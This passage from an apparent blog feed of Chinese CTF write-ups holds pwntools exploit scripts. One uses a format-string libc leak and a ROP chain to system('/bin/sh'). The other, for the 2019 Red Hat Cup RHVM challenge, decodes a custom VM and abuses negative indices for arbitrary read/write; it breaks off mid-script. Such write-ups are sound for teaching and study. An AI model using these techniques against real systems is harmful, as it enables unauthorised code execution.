keyword">print</span><span class="token punctuation">(</span><span class="token string">"leak info (may set a and b to get real info) : "</span><span class="token punctuation">,</span>info<span class="token punctuation">)</span>    <span class="token keyword">return</span> info<span class="token keyword">def</span> <span class="token function">get_int</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    content<span class="token operator">=</span><span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    out<span class="token operator">=</span><span class="token punctuation">[</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"content to int end is : "</span><span class="token punctuation">,</span>out<span class="token punctuation">)</span>    <span class="token keyword">return</span> contentsend_name<span class="token punctuation">(</span><span class="token string">"%p-%p"</span><span class="token punctuation">)</span>show_name<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_formate_result<span class="token punctuation">(</span><span class="token punctuation">)</span>info<span class="token operator">=</span>get_int<span class="token punctuation">(</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x3c6780</span>pop_rdi_ret<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x0000000000021112</span>payload<span class="token operator">=</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input note:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>new_node<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete_node<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show_node<span class="token punctuation">(</span><span class="token punctuation">)</span>heap_addr<span class="token operator">=</span>leak_result<span class="token punctuation">(</span><span class="token string">"index 1:"</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x20</span><span class="token comment" spellcheck="true"># gift("a"+"\n")</span><span class="token comment" spellcheck="true">#debug_1([0x00000000000012C2,0x0000000000011B8])</span>gift<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\xa9"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019红帽杯 粤湾中心 (RHVM)</title>
      <link href="1970/01/01/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%20%E7%B2%A4%E6%B9%BE%E4%B8%AD%E5%BF%83%20(RHVM)/"/>
      <url>1970/01/01/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%20%E7%B2%A4%E6%B9%BE%E4%B8%AD%E5%BF%83%20(RHVM)/</url>
      
        <content type="html"><![CDATA[<h2 id="code结构"><a href="#code结构" class="headerlink" title="code结构"></a>code结构</h2><p>code结构</p><pre class=" language-bash"><code class="language-bash">输入0x0706050403020100得到的测试结果为0x000105040302</code></pre><p>实际对应关系是<br>0x050403020100<br>变为<br>0x000105040302</p><p>0位置被移动到5位置想要处理后得到想要的值应该要把05放到0位置。<br>如下脚本完成上述操作</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#从fro到to进行移位操作,索引从0开始</span><span class="token keyword">def</span> <span class="token function">left</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>item<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token keyword">def</span> <span class="token function">yiwei</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>fro<span class="token punctuation">,</span>to<span class="token punctuation">,</span>bit<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>        fro_bit<span class="token operator">=</span><span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span> <span class="token comment" spellcheck="true">#取出来第fro位</span>        fro_bit_8<span class="token operator">=</span>fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把fro位复制到其他位</span>        result<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fro_bit_8 <span class="token comment" spellcheck="true">#删除多余的</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>        fro_bit <span class="token operator">=</span> <span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  <span class="token comment" spellcheck="true"># 取出来第fro位</span>        fro_bit_8 <span class="token operator">=</span> fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 把fro位复制到其他位</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> fro_bit_8  <span class="token comment" spellcheck="true"># 删除多余的</span>decoding<span class="token operator">=</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><h2 id="指令分类"><a href="#指令分类" class="headerlink" title="指令分类"></a>指令分类</h2><p>像这种进行数学运算的肯定是寄存器</p><pre class=" language-c"><code class="language-c"><span class="token function">sub_106C</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// *a1 += *a2;</span></code></pre><p>这种包含加加减减操作，都是取指指令肯定是栈</p><pre class=" language-c"><code class="language-c"><span class="token function">save_to_qword_203058</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  *(_DWORD *)(qword_203058 + 4LL * ++esp_dword_203010) = *a1;</span></code></pre><p>另外还有一个不知道是哪的地址应该就是内存</p><pre class=" language-c"><code class="language-c"><span class="token function">load</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data1<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>REG_dword_203060<span class="token punctuation">[</span>op_info<span class="token operator">-></span>op_data2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// dword_203060[*a1] = dword_203080[*a2]; 寄存器取出两个索引，从内存取值放入寄存器</span></code></pre><p>向任意一个地址写入数据的方法有两种</p><ul><li>1、基地址加偏移量，修改偏移量就可以实现任意地址写，一般libc加载地址是变的，这个偏移量也会变，计算起来比较麻烦。</li><li>2、向一个地址处写入地址，再向这个地址写入值。这种方式简单但是需要程序里面提供这种两层地址的寻址方式。可以重点观察bss段写入的指针。</li></ul><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>数据存放进去之后在运算过程中可以出现负数，负数的load和save会造成任意地址读写。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>从bss段load到stdin的地址，计算偏移得到_IO_2_1_stdin.fileno的地址（实际上因为是_IO_2_1_stdin.fileno-4，因为push指令是先加的），然后用push向这个地址处写0x233</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>file_path <span class="token operator">=</span> <span class="token string">"./RHVM.bin"</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span><span class="token comment" spellcheck="true"># context.terminal = ['tmux', 'splitw', '-h']</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#从fro到to进行移位操作,索引从0开始</span><span class="token keyword">def</span> <span class="token function">left</span><span class="token punctuation">(</span>item<span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>item<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffffffffffff</span><span class="token keyword">def</span> <span class="token function">yiwei</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span>fro<span class="token punctuation">,</span>to<span class="token punctuation">,</span>bit<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>        fro_bit<span class="token operator">=</span><span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span> <span class="token comment" spellcheck="true">#取出来第fro位</span>        fro_bit_8<span class="token operator">=</span>fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把fro位复制到其他位</span>        result<span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fro_bit_8 <span class="token comment" spellcheck="true">#删除多余的</span>        <span class="token comment" spellcheck="true"># print("result:",hex(to))</span>        <span class="token keyword">return</span> result    <span class="token keyword">if</span> bit<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>        fro_bit <span class="token operator">=</span> <span class="token punctuation">(</span>content<span class="token operator">>></span><span class="token punctuation">(</span>fro<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  <span class="token comment" spellcheck="true"># 取出来第fro位</span>        fro_bit_8 <span class="token operator">=</span> fro_bit<span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>left<span class="token punctuation">(</span>fro_bit<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># 把fro位复制到其他位</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">0xff</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>to <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> fro_bit_8  <span class="token comment" spellcheck="true"># 删除多余的</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>file_path<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># gdb.attach(p, "b *$rebase(0x121c)")</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.111.104.169'</span><span class="token punctuation">,</span> <span class="token number">57404</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>    one_gadget <span class="token operator">=</span> <span class="token number">0x0</span><span class="token keyword">def</span> <span class="token function">debug_1</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span>PIE<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    debug_str <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> PIE<span class="token punctuation">:</span>        text_base <span class="token operator">=</span> int<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">"pmap {}| awk '{{print $1}}'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n x /50xg 0x203058+{}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>text_base<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> addr<span class="token punctuation">:</span>            text_base<span class="token operator">=</span><span class="token number">0</span>            debug_str<span class="token operator">+=</span><span class="token string">'b *{}\n'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>text_base<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">,</span>debug_str<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    encoding<span class="token operator">=</span><span class="token punctuation">(</span>item<span class="token operator">>></span><span class="token number">16</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token operator">&amp;</span><span class="token number">0xff00</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span>item<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print("encoding: ",hex(encoding))</span>    <span class="token keyword">return</span> encoding<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># decoding=((item&amp;0x00ff00000000)>>(3*8))|((item&amp;0xff0000000000)>>(5*8))|((item&amp;0xffffffff)&lt;&lt;(2*8))</span>    decoding<span class="token operator">=</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">|</span>yiwei<span class="token punctuation">(</span>item<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print("decoding: ", hex(decoding))</span>    <span class="token keyword">return</span> decoding    <span class="token comment" spellcheck="true">#0x06050403</span><span class="token keyword">def</span> <span class="token function">PUSH</span><span class="token punctuation">(</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0x70</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ReadREG</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0x40</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">REGMul</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0xd0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RGEShl</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0xe0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">RegCheng</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0xc0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">LoadM</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0x42</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">AddGeg</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0xa0</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">SaveMem</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0x41</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">PrintInfo</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span>a2<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> decode<span class="token punctuation">(</span><span class="token number">0x60</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a2<span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> a1 <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>EIP<span class="token operator">=</span><span class="token number">0</span>ESP<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true"># &amp;stdout_offset=0x203020</span>fileno_off<span class="token operator">=</span><span class="token number">0x3ec7d0</span>stdout_off<span class="token operator">=</span><span class="token number">0x3ec760</span><span class="token comment" spellcheck="true">#0x70,0x40</span><span class="token comment" spellcheck="true"># debug_1([0x000000000000181D])</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"EIP: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>EIP<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token 